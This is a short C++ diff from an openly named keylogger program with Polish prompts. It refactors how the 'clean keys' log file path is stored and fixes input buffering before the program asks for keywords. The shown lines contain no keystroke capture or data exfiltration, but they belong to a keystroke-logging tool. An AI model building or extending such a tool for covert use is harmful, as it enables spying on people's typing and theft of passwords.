@@ -14,6 +14,7 @@
 #include <string>
 #include <sstream>
 #include <algorithm>
+#include <limits>
 
 
 Keylogger::Keylogger() { }
@@ -265,9 +266,9 @@ std::string Keylogger::create_file()
 	// Append keyword to a file name
 	// TODO: This should be as a utility function as this is used in many places
 	size_t position_to_prepend = m_file_path.find(".log");
-	std::string path_for_clean_keys = m_file_path;
-	path_for_clean_keys.insert(position_to_prepend, "_czyste_klawisze"); // No tabs, caps locks etc
-	this->file_logs_clean_keys.open(path_for_clean_keys);
+	m_file_path_clean_keys = m_file_path;
+	m_file_path_clean_keys.insert(position_to_prepend, "_czyste_klawisze"); // No tabs, caps locks etc
+	this->file_logs_clean_keys.open(m_file_path_clean_keys);
 
 	return m_file_path;
 }
@@ -281,6 +282,8 @@ std::ofstream& Keylogger::get_file_logs_clean_keys()
  * at the time they are typed again. */
 std::vector<std::string> get_keywords()
 {
+	std::cin.ignore(); // We use getline() below, which would take everything what is in a buffer already.
+	
 	std::string keyword;
 	std::cout << "Prosze wpisac slowa KLUCZ (oddzielone spacja): ";
 	std::getline(std::cin, keyword);
